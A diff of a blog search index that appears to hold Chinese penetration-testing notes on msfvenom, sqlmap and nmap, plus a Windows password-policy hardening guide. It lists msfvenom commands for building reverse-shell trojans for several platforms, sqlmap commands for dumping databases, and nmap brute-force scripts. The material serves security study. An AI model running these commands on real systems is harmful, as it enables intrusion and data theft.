@@ -1,85 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Msfvenom</title>
-    <url>/2021/11/15/Msfvenom/</url>
-    <content><![CDATA[<h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p>
-<p>用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;</p>
-<p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</IP></p>
-<p>选项：</p>
-<p>-l、 –列出&lt;类型&gt;列出[类型]的所有模块。类型有：有效载荷、编码器、NOP、平台、ARCH、加密、格式等</p>
-<p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</payload></p>
-<p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</value></p>
-<p>-f、 –format<format>输出格式（使用–list要列出的格式）</format></p>
-<p>-e、 –编码器&lt;编码器&gt;要使用的编码器（使用–列出要列出的编码器）</p>
-<p>–服务名称<value>生成服务二进制文件时要使用的服务名称</value></p>
-<p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</value></p>
-<p>–使用所有可用编码器生成尽可能最小的有效负载</p>
-<p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</value></p>
-<p>–加密密钥<value>用于–encrypt的密钥</value></p>
-<p>–encrypt iv<value>的初始化向量–encrypt</value></p>
-<p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</arch></p>
-<p>–平台<platform>platform for–payload（使用–list要列出的平台）</platform></p>
-<p>-o、 –out<path></path>将有效负载保存到文件</p>
-<p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</list></p>
-<p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</length></p>
-<p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</length></p>
-<p>-s、 –空间&lt;长度&gt;产生的有效载荷的最大尺寸</p>
-<p>–编码器空间&lt;长度&gt;编码有效负载的最大大小（默认为-s值）</p>
-<p>-i、 –迭代&lt;计数&gt;对有效负载进行编码的次数</p>
-<p>-c、 –添加代码<path></path>指定要包含的其他win32外壳代码文件</p>
-<p>-x、 –template<path></path>指定要用作模板的自定义可执行文件</p>
-<p>-k、 –保留–template行为并将有效负载作为新线程注入</p>
-<p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</value></p>
-<p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</second></p>
-<p>常用木马：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows:
-格式：msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Liunx：
-格式：msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>PORT<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PHP：
-格式：msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ASP：
-格式：msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f asp <span class="token operator">></span> shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">JSP：
-格式：msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;[IP] LPORT&#x3D;[PORT] -f raw &gt; shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Python：
-格式：msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Bash：
-格式：msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Perl：
-格式：msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Msfconsole</title>
     <url>/2021/11/15/Msfconsole/</url>
     <content><![CDATA[<h2 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2><p><strong>Msfconsole初始化参数：</strong></p>
@@ -177,6 +98,180 @@
       </tags>
   </entry>
   <entry>
+    <title>sqlmap工具</title>
+    <url>/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="SQLmap："><a href="#SQLmap：" class="headerlink" title="SQLmap："></a><strong>SQLmap：</strong></h2><p><strong>SQLmap参数：</strong></p>
+<p>-u  URL=URL目标URL</p>
+<p>-r 通过文本来进行探测（抓取数据复制到文本）</p>
+<p>-g Google dork将Google dork结果处理为目标URL</p>
+<p>–data=DATA 通过POST发送的数据字符串（例如“id=1”）</p>
+<p>–cookie=cookie HTTP cookie头值（例如“PHPSESSID=a8d127e..”）</p>
+<p> –random-agent  随机代理使用随机选择的HTTP用户代理头值</p>
+<p> –proxy=PROXY  代理使用代理连接到目标URL</p>
+<p> –level=LEVEL  要执行的测试级别（1-5，默认为1）</p>
+<p>(指定Level进行探测爆破(不加等级时，默认1,最高是5):</p>
+<p>level 1 (不添加时默认)</p>
+<p>level 2 (测试HTTP和cookie)</p>
+<p>level 3 (测试HTTP user-agent/referer)</p>
+<p>不确定payload或那个参数是注入点</p>
+<p>用越高的level探测，时间相对也会长）</p>
+<p> –risk=RISK 风险=执行测试的风险（1-3，默认值1）</p>
+<p> -b, –banner         标题检索DBMS标题</p>
+<p>–second-url          重定第二个网页</p>
+<p> –current-user      当前用户检索DBMS当前用户</p>
+<p> –current-db         当前数据库检索DBMS当前数据库</p>
+<p> –passwords        密码枚举DBMS用户密码哈希</p>
+<p> –tables                表枚举DBMS数据库表</p>
+<p> –columns            列枚举DBMS数据库表列</p>
+<p> –schema             模式枚举DBMS模式</p>
+<p> –dump                 转储DBMS数据库表项</p>
+<p> –dump-all            转储所有转储所有DBMS数据库表条目</p>
+<p> -D DB                  要枚举的D DB DBMS数据库</p>
+<p> -T TBL                 要枚举的TBL DBMS数据库表</p>
+<p> -C COL                要枚举的C列DBMS数据库表列</p>
+<p> –os-shell             用于交互式操作系统外壳的os外壳提示符</p>
+<p> –os-pwn              提示输入OOB外壳、流量计或VNC</p>
+<p> –batch                 批处理从不要求用户输入，请使用默认行为</p>
+<p><strong>SQLmap基本使用：</strong></p>
+<p>指定网页进行注入点探测</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/sqlmap1.png"></p>
+<p>列出当前所有的库</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> --dbs  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/sqlmap2.png"></p>
+<p>列出当前选中库的表</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/sqlmap3.png"></p>
+<p>列出当前选中表和库的字段</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T <span class="token string">'表'</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/sqlmap4.png"></p>
+<p>列出当前选中表，库，字段的记录</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T ‘表’ -C ‘字段’ --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/sqlmap5.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nmap扫描</title>
+    <url>/2021/11/12/nmap%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><strong>Nmap参数：</strong></p>
+<p>-A #进行综合性扫描<br>       -O #进行系统版本扫描<br>       -p #指定端口扫描<br>       -v #显示扫描过程<br>       -e #指定网卡进行扫描<br>       -T #加速扫描过程，默认时序4，最高为6<br>       -n #不进行dns解析<br>       -Pn #不进行ping扫描<br>       -sP #判断主机存活<br>       -sS #SYN半连接扫描探测端口开放状态<br>       -sV #进行服务版本扫描<br>       -sX #圣诞树扫描<br>       -sF FIN扫描<br>       -sU #使用UDP扫描方式确定UDP端口状态<br>       -sT #TCP端口扫描<br>       -sW #滑动窗口扫描<br>       -sO #主机协议扫描<br>       -sL #dns反向解析<br>       -sR #RPC扫描<br>       -sL #完全隐藏扫描<br>       -sn #只进行主机发现，不进行端口扫描<br>       -oX #将扫描结果生成xml文件<br>       -iL #指定文本文件扫描</p>
+<p><strong>Nmap脚本扫描：</strong></p>
+<p>脚本存放路径：/usr/share/nmap/scripts</p>
+<p>nmap –script mysql-vuln-cve2012-2122 ip root连续攻击</p>
+<p>nmap -p3306 –script mysql-empty-password ip 扫描root空口令</p>
+<p>nmap –script=auth IP地址 绕过鉴权的扫描，也可以扫描弱口令<br>       nmap –script=brute IP地址 暴力破解,mysql,snmp,smb,密码猜解</p>
+<p>nmap –script=default IP地址 收集应用服务信息，针对具体服务攻击</p>
+<p>nmap –script=vuln IP地址 检查是否存在常见漏洞<br>       nmap -n -p端口 –script=broadcast IP地址 在局域网探索更多服务</p>
+<p>nmap –script=vnc-auth IP地址 检查VNC认证方式</p>
+<p>nmap –script=vnc-info IP地址 获取VNC信息<br>       nmap –script=smb-brute.nse IP地址 smb破解</p>
+<p>nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 smb字典</p>
+<p>nmap –script=smb-check-vulns.nse –script-args=unsafe=1 IP地址 smb已知几个严重漏洞</p>
+<p>nmap -p 445 –script smb-ls –script-args ‘share=e$,path=,smbpass=test’ IP地址 查看共享目录</p>
+<p>nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test IP地址 查看会话</p>
+<p>nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test IP地址 查看系统信息</p>
+<p>nmap -p 1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 猜解微软mssql用          户名和密码</p>
+<p>nmap -p3306 –script=mysql-empty-password.nse IP地址 扫描ROOT空口令</p>
+<p>nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root IP地址 列出所有mysql用户]</p>
+<p>nmap -sV –script=telnet-brute IP地址 telnet破解</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Msfvenom</title>
+    <url>/2021/11/15/Msfvenom/</url>
+    <content><![CDATA[<h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p>
+<p>用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;</p>
+<p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</p>
+<p>选项：</p>
+<p>-l、 –列出&lt;类型&gt;列出[类型]的所有模块。类型有：有效载荷、编码器、NOP、平台、ARCH、加密、格式等</p>
+<p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</p>
+<p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</p>
+<p>-f、 –format<format>输出格式（使用–list要列出的格式）</p>
+<p>-e、 –编码器&lt;编码器&gt;要使用的编码器（使用–列出要列出的编码器）</p>
+<p>–服务名称<value>生成服务二进制文件时要使用的服务名称</p>
+<p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</p>
+<p>–使用所有可用编码器生成尽可能最小的有效负载</p>
+<p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</p>
+<p>–加密密钥<value>用于–encrypt的密钥</p>
+<p>–encrypt iv<value>的初始化向量–encrypt</p>
+<p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</p>
+<p>–平台<platform>platform for–payload（使用–list要列出的平台）</p>
+<p>-o、 –out<path>将有效负载保存到文件</p>
+<p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</p>
+<p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</p>
+<p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</p>
+<p>-s、 –空间&lt;长度&gt;产生的有效载荷的最大尺寸</p>
+<p>–编码器空间&lt;长度&gt;编码有效负载的最大大小（默认为-s值）</p>
+<p>-i、 –迭代&lt;计数&gt;对有效负载进行编码的次数</p>
+<p>-c、 –添加代码<path>指定要包含的其他win32外壳代码文件</p>
+<p>-x、 –template<path>指定要用作模板的自定义可执行文件</p>
+<p>-k、 –保留–template行为并将有效负载作为新线程注入</p>
+<p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</p>
+<p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</p>
+<p>常用木马：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows:
+格式：msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Liunx：
+格式：msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>PORT<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PHP：
+格式：msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ASP：
+格式：msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f asp <span class="token operator">></span> shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">JSP：
+格式：msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;[IP] LPORT&#x3D;[PORT] -f raw &gt; shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Python：
+格式：msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Bash：
+格式：msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Perl：
+格式：msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Netcat工具</title>
     <url>/2021/11/10/netcat%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><strong>Netcat参数：</strong></p>
@@ -247,98 +342,80 @@
       </tags>
   </entry>
   <entry>
-    <title>nmap扫描</title>
-    <url>/2021/11/12/nmap%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><strong>Nmap参数：</strong></p>
-<p>-A #进行综合性扫描<br>       -O #进行系统版本扫描<br>       -p #指定端口扫描<br>       -v #显示扫描过程<br>       -e #指定网卡进行扫描<br>       -T #加速扫描过程，默认时序4，最高为6<br>       -n #不进行dns解析<br>       -Pn #不进行ping扫描<br>       -sP #判断主机存活<br>       -sS #SYN半连接扫描探测端口开放状态<br>       -sV #进行服务版本扫描<br>       -sX #圣诞树扫描<br>       -sF FIN扫描<br>       -sU #使用UDP扫描方式确定UDP端口状态<br>       -sT #TCP端口扫描<br>       -sW #滑动窗口扫描<br>       -sO #主机协议扫描<br>       -sL #dns反向解析<br>       -sR #RPC扫描<br>       -sL #完全隐藏扫描<br>       -sn #只进行主机发现，不进行端口扫描<br>       -oX #将扫描结果生成xml文件<br>       -iL #指定文本文件扫描</p>
-<p><strong>Nmap脚本扫描：</strong></p>
-<p>脚本存放路径：/usr/share/nmap/scripts</p>
-<p>nmap –script mysql-vuln-cve2012-2122 ip root连续攻击</p>
-<p>nmap -p3306 –script mysql-empty-password ip 扫描root空口令</p>
-<p>nmap –script=auth IP地址 绕过鉴权的扫描，也可以扫描弱口令<br>       nmap –script=brute IP地址 暴力破解,mysql,snmp,smb,密码猜解</p>
-<p>nmap –script=default IP地址 收集应用服务信息，针对具体服务攻击</p>
-<p>nmap –script=vuln IP地址 检查是否存在常见漏洞<br>       nmap -n -p端口 –script=broadcast IP地址 在局域网探索更多服务</p>
-<p>nmap –script=vnc-auth IP地址 检查VNC认证方式</p>
-<p>nmap –script=vnc-info IP地址 获取VNC信息<br>       nmap –script=smb-brute.nse IP地址 smb破解</p>
-<p>nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 smb字典</p>
-<p>nmap –script=smb-check-vulns.nse –script-args=unsafe=1 IP地址 smb已知几个严重漏洞</p>
-<p>nmap -p 445 –script smb-ls –script-args ‘share=e$,path=,smbpass=test’ IP地址 查看共享目录</p>
-<p>nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test IP地址 查看会话</p>
-<p>nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test IP地址 查看系统信息</p>
-<p>nmap -p 1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 猜解微软mssql用          户名和密码</p>
-<p>nmap -p3306 –script=mysql-empty-password.nse IP地址 扫描ROOT空口令</p>
-<p>nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root IP地址 列出所有mysql用户]</p>
-<p>nmap -sV –script=telnet-brute IP地址 telnet破解</p>
+    <title>密码策略配置</title>
+    <url>/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h3 id="密码策略配置"><a href="#密码策略配置" class="headerlink" title="密码策略配置"></a>密码策略配置</h3><p><strong>Windows下的密码配置</strong></p>
+<p>​    <strong>前提：一些windows版本没有组策略，需要自行配置，复制下方内容到txt文本，后缀改为bat或cmd运行即可</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off
+
+<span class="token function">pushd</span> <span class="token string">"%~dp0"</span>
+
+<span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum <span class="token operator">></span>List.txt
+
+<span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum <span class="token operator">>></span>List.txt
+
+<span class="token keyword">for</span> /f %%i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'findstr /i . List.txt 2^>nul'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> dism /online /norestart /add-package:<span class="token string">"C:\Windows\servicing\Packages\%%i"</span>
+
+pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li><p>配置密码复杂性，密码最长使用期限，密码长度最小值不小于八位</p>
+<ul>
+<li>（Win+R输入 gpedit.msc）</li>
+<li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;密码策略-&gt;设置1、密码必须符合复杂性要求（启用），2、密码长度最小值（不小于八位），3、密码最长使用期限</li>
+<li><img src="/images/w1.png"></li>
+<li><img src="/images/w2.jpg"></li>
+<li><img src="/images/w3.png"></li>
+</ul>
+</li>
+<li><p>配置windows登录，五次登录之后，自动锁定账户一分钟</p>
+<ul>
+<li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;账户锁定策略-&gt;1、设置账户锁定阈值（五次）2、账户锁定时间（一分钟）</li>
+<li><img src="/images/w4.png"></li>
+<li><img src="/images/w5.png"></li>
+</ul>
+</li>
+<li><p>设置windows试图登录的用户提示的消息文本内容为For authorized users only</p>
+<ul>
+<li>Windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项-&gt;交互式登录：试图登录的用户的消息文本</li>
+<li><img src="/images/w6.png"></li>
+</ul>
+</li>
+<li><p>设置windows远程时用户非活动会话链接应小于等于五分钟</p>
+<ul>
+<li>用户配置-&gt;管理面板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;会话时间限制-&gt;设置活动但空闲的远程桌面服务会话的时间限制（启用并设置五分钟）</li>
+<li><img src="/images/w7.png"></li>
+</ul>
+</li>
+<li><p>对windows服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听</p>
+<ul>
+<li>计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;安全-&gt;设置</li>
+<li>远程（RDP）连接要求使用指定的安全层（SSL）</li>
+<li>要求安全的RPC通信</li>
+<li>设置客户端连接加密级别（高级别）</li>
+<li><img src="/images/w8.png"></li>
+<li><img src="/images/w9.png"></li>
+<li><img src="/images/w10.png"></li>
+</ul>
+</li>
+<li><p>普通用户进行最小权限管理，对关闭系统仅限超级管理员帐号</p>
+<ul>
+<li>计算机配置-&gt;Windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;关闭系统（除administrators外的用户删除）</li>
+<li><img src="/images/w11.png"></li>
+</ul>
+</li>
+<li><p>查找并删除主机可能存在的hacker用户</p>
+<ul>
+<li><img src="/images/w12.png"></li>
+</ul>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>密码策略</category>
       </categories>
       <tags>
-        <tag>渗透工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap工具</title>
-    <url>/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="SQLmap："><a href="#SQLmap：" class="headerlink" title="SQLmap："></a><strong>SQLmap：</strong></h2><p><strong>SQLmap参数：</strong></p>
-<p>-u  URL=URL目标URL</p>
-<p>-r 通过文本来进行探测（抓取数据复制到文本）</p>
-<p>-g Google dork将Google dork结果处理为目标URL</p>
-<p>–data=DATA 通过POST发送的数据字符串（例如“id=1”）</p>
-<p>–cookie=cookie HTTP cookie头值（例如“PHPSESSID=a8d127e..”）</p>
-<p> –random-agent  随机代理使用随机选择的HTTP用户代理头值</p>
-<p> –proxy=PROXY  代理使用代理连接到目标URL</p>
-<p> –level=LEVEL  要执行的测试级别（1-5，默认为1）</p>
-<p>(指定Level进行探测爆破(不加等级时，默认1,最高是5):</p>
-<p>level 1 (不添加时默认)</p>
-<p>level 2 (测试HTTP和cookie)</p>
-<p>level 3 (测试HTTP user-agent/referer)</p>
-<p>不确定payload或那个参数是注入点</p>
-<p>用越高的level探测，时间相对也会长）</p>
-<p> –risk=RISK 风险=执行测试的风险（1-3，默认值1）</p>
-<p> -b, –banner         标题检索DBMS标题</p>
-<p>–second-url          重定第二个网页</p>
-<p> –current-user      当前用户检索DBMS当前用户</p>
-<p> –current-db         当前数据库检索DBMS当前数据库</p>
-<p> –passwords        密码枚举DBMS用户密码哈希</p>
-<p> –tables                表枚举DBMS数据库表</p>
-<p> –columns            列枚举DBMS数据库表列</p>
-<p> –schema             模式枚举DBMS模式</p>
-<p> –dump                 转储DBMS数据库表项</p>
-<p> –dump-all            转储所有转储所有DBMS数据库表条目</p>
-<p> -D DB                  要枚举的D DB DBMS数据库</p>
-<p> -T TBL                 要枚举的TBL DBMS数据库表</p>
-<p> -C COL                要枚举的C列DBMS数据库表列</p>
-<p> –os-shell             用于交互式操作系统外壳的os外壳提示符</p>
-<p> –os-pwn              提示输入OOB外壳、流量计或VNC</p>
-<p> –batch                 批处理从不要求用户输入，请使用默认行为</p>
-<p><strong>SQLmap基本使用：</strong></p>
-<p>指定网页进行注入点探测</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap1.png"></p>
